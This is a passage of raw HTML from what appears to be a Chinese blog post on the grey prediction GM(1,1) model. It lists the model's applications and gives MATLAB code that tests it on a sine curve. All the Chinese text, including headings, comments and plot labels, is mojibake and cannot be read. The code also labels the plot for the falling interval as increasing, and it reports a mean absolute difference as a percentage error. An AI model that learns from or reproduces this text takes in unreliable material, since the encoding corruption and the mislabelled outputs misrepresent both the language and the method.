id="é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ"><a href="#é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ"></a>é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ</h2><blockquote><p>ä¸€èˆ¬åœ°è¯´ï¼Œ<a href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">ç¤¾ä¼šç³»ç»Ÿ</a>ã€<a href="https://baike.baidu.com/item/%E7%BB%8F%E6%B5%8E%E7%B3%BB%E7%BB%9F/3897147" target="_blank" rel="noopener">ç»æµç³»ç»Ÿ</a>ã€ç”Ÿæ€ç³»ç»Ÿéƒ½æ˜¯ç°è‰²ç³»ç»Ÿã€‚ä¾‹å¦‚ç‰©ä»·ç³»ç»Ÿï¼Œå¯¼è‡´ç‰©ä»·ä¸Šæ¶¨çš„å› ç´ å¾ˆå¤šï¼Œä½†å·²çŸ¥çš„å´ä¸å¤šï¼Œå› æ­¤å¯¹ç‰©ä»·è¿™ä¸€ç°è‰²ç³»ç»Ÿçš„é¢„æµ‹å¯ä»¥ç”¨ç°è‰²é¢„æµ‹æ–¹æ³•ã€‚</p></blockquote><h2 id="ç°è‰²æ¨¡å‹çš„åº”ç”¨"><a href="#ç°è‰²æ¨¡å‹çš„åº”ç”¨" class="headerlink" title="ç°è‰²æ¨¡å‹çš„åº”ç”¨"></a>ç°è‰²æ¨¡å‹çš„åº”ç”¨</h2><blockquote><p>1ã€æ•°åˆ—é¢„æµ‹ã€‚å¯¹æŸç°è±¡éšæ—¶é—´çš„é¡ºå»¶è€Œå‘ç”Ÿçš„å˜åŒ–æ‰€åšçš„é¢„æµ‹å®šä¹‰ä¸ºæ•°åˆ—é¢„æµ‹ã€‚ä¾‹å¦‚å¯¹<a href="https://baike.baidu.com/item/%E6%B6%88%E8%B4%B9%E7%89%A9%E4%BB%B7%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">æ¶ˆè´¹ç‰©ä»·æŒ‡æ•°</a>çš„é¢„æµ‹ï¼Œéœ€è¦ç¡®å®šä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯æ¶ˆè´¹ç‰©ä»·æŒ‡æ•°çš„æ°´å¹³ã€‚å¦ä¸€ä¸ªæ˜¯è¿™ä¸€æ°´å¹³æ‰€å‘ç”Ÿçš„æ—¶é—´ã€‚</p><p>2ã€ç¾å˜é¢„æµ‹ã€‚å¯¹å‘ç”Ÿç¾å®³æˆ–å¼‚å¸¸çªå˜æ—¶é—´å¯èƒ½å‘ç”Ÿçš„æ—¶é—´é¢„æµ‹ç§°ä¸ºç¾å˜é¢„æµ‹ã€‚ä¾‹å¦‚å¯¹åœ°éœ‡æ—¶é—´çš„é¢„æµ‹ã€‚</p><p>3ã€å­£èŠ‚æ€§ç¾å˜é¢„æµ‹ã€‚å¯¹å‘ç”Ÿåœ¨æ¯å¹´ç‰¹å®šæ—¶åŒºçš„äº‹ä»¶æˆ–å‘½é¢˜ä½œç°é¢„æµ‹ï¼Œç§°å­£èŠ‚ç¾å˜ç°é¢„æµ‹ã€‚</p><p>4ã€æ‹“æ‰‘é¢„æµ‹ã€‚å°†åŸå§‹æ•°æ®ä½œæ›²çº¿ï¼Œåœ¨æ›²çº¿ä¸ŠæŒ‰å®šå€¼å¯»æ‰¾è¯¥å®šå€¼å‘ç”Ÿçš„æ‰€æœ‰<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9" target="_blank" rel="noopener">æ—¶ç‚¹</a>ï¼Œå¹¶ä»¥è¯¥å®šå€¼ä¸ºæ¡†æ¶æ„æˆ<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9%E6%95%B0%E5%88%97" target="_blank" rel="noopener">æ—¶ç‚¹æ•°åˆ—</a>ï¼Œç„¶åå»ºç«‹æ¨¡å‹é¢„æµ‹æœªæ¥è¯¥å®šå€¼æ‰€å‘ç”Ÿçš„æ—¶ç‚¹ã€‚</p><p>5ã€<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E9%A2%84%E6%B5%8B/12609292" target="_blank" rel="noopener">ç³»ç»Ÿé¢„æµ‹</a>ã€‚å¯¹ç³»ç»Ÿä¸­ä¼—å¤šå˜é‡é—´ç›¸äº’åè°ƒå…³ç³»çš„å‘å±•å˜åŒ–æ‰€è¿›è¡Œçš„é¢„æµ‹ç§°ä¸ºç³»ç»Ÿé¢„æµ‹ã€‚ä¾‹å¦‚å¸‚åœºä¸­<a href="https://baike.baidu.com/item/%E6%9B%BF%E4%BB%A3%E5%95%86%E5%93%81" target="_blank" rel="noopener">æ›¿ä»£å•†å“</a>ã€ç›¸äº’å…³è”å•†å“<a href="https://baike.baidu.com/item/%E9%94%80%E5%94%AE%E9%87%8F" target="_blank" rel="noopener">é”€å”®é‡</a>äº’ç›¸åˆ¶çº¦çš„é¢„æµ‹ã€‚</p><p>6ã€åŒ…ç»œç°é¢„æµ‹ã€‚å¯¹äºéš¾ä»¥ç”¨æ•°åˆ—é¢„æµ‹æˆ–ç¾å˜é¢„æµ‹å¤„ç†ï¼Œä¹Ÿä¸å¿…ç”¨æ‹“æ‰‘é¢„æµ‹è®¡ç®—çš„ç¦»ä¹±åºåˆ—ï¼Œå¯ä»¥æ„é€ ä¸Šè¾¹ç•Œ GM(1ï¼Œ1) ä¸ä¸‹è¾¹ç•Œ GM(1ï¼Œ1) è¿›è¡Œè¦†ç›–ï¼Œè¿™ç§è¾¹ç•Œæ¨¡å‹å³åŒ…ç»œæ¨¡å‹ã€‚</p></blockquote><h2 id="ç°è‰²æ¨¡å‹æµ‹è¯•"><a href="#ç°è‰²æ¨¡å‹æµ‹è¯•" class="headerlink" title="ç°è‰²æ¨¡å‹æµ‹è¯•"></a>ç°è‰²æ¨¡å‹æµ‹è¯•</h2><p>ä»¥sin(pi*x/20)å‡½æ•°ä¸ºä¾‹ï¼Œä»¥å•è°ƒæ€§ä¸ºåŒºé—´æ£€éªŒç°è‰²æ¨¡å‹é¢„æµ‹çš„ç²¾åº¦ ã€‚</p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%æ‘˜è‡ªAngel_kittyå¸ˆå‚…çš„matlabç¨‹åºä»£ç </span>clcclear all<span class="token comment" spellcheck="true">% æœ¬ç¨‹åºä¸»è¦ç”¨æ¥è®¡ç®—æ ¹æ®ç°è‰²ç†è®ºå»ºç«‹çš„æ¨¡å‹çš„é¢„æµ‹å€¼ã€‚</span><span class="token comment" spellcheck="true">% åº”ç”¨çš„æ•°å­¦æ¨¡å‹æ˜¯ GM(1,1)ã€‚</span><span class="token comment" spellcheck="true">% åŸå§‹æ•°æ®çš„å¤„ç†æ–¹æ³•æ˜¯ä¸€æ¬¡ç´¯åŠ æ³•ã€‚</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>yy<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    <span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT<span class="token operator">=</span>B<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token number">-1</span>    <span class="token function">YN</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN<span class="token operator">=</span>YN<span class="token operator">'</span><span class="token punctuation">;</span>A<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT<span class="token operator">*</span>B<span class="token punctuation">)</span><span class="token operator">*</span>BT<span class="token operator">*</span>YN<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t<span class="token operator">=</span>u<span class="token operator">/</span>a<span class="token punctuation">;</span>t_test<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test<span class="token operator">+</span>n<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n<span class="token operator">+</span>t_test<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token punctuation">;</span>xs<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">;</span>yn<span class="token operator">=</span><span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">;</span>det<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    det<span class="token operator">=</span>det<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det<span class="token operator">=</span>det<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs<span class="token punctuation">,</span>yn<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å•è°ƒé€’å¢'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%é€’å‡</span>y1<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x1<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n1<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">;</span>yy1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    <span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT1<span class="token operator">=</span>B1<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token number">-1</span>    <span class="token function">YN1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN1<span class="token operator">=</span>YN1<span class="token operator">'</span><span class="token punctuation">;</span>A1<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT1<span class="token operator">*</span>B1<span class="token punctuation">)</span><span class="token operator">*</span>BT1<span class="token operator">*</span>YN1<span class="token punctuation">;</span>a1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token operator">=</span>u1<span class="token operator">/</span>a1<span class="token punctuation">;</span>t_test1<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test1<span class="token operator">+</span>n1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a1<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n1<span class="token operator">+</span>t_test1<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x21<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token punctuation">;</span>xs1<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">;</span>yn1<span class="token operator">=</span><span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">;</span>det1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    det1<span class="token operator">=</span>det1<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det1<span class="token operator">=</span>det1<span class="token operator">/</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs1<span class="token punctuation">,</span>yn1<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å•è°ƒé€’å¢'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys1</span><span class="token punctuation">(</span>n1<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%æ•´ä¸ªåŒºé—´</span>y2<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x2<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n2<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>yy2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    <span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT2<span class="token operator">=</span>B2<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token number">-1</span>    <span class="token function">YN2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN2<span class="token operator">=</span>YN2<span class="token operator">'</span><span class="token punctuation">;</span>A2<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT2<span class="token operator">*</span>B2<span class="token punctuation">)</span><span class="token operator">*</span>BT2<span class="token operator">*</span>YN2<span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>u2<span class="token operator">/</span>a2<span class="token punctuation">;</span>t_test2<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test2<span class="token operator">+</span>n2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t2<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a2<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n2<span class="token operator">+</span>t_test2<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token 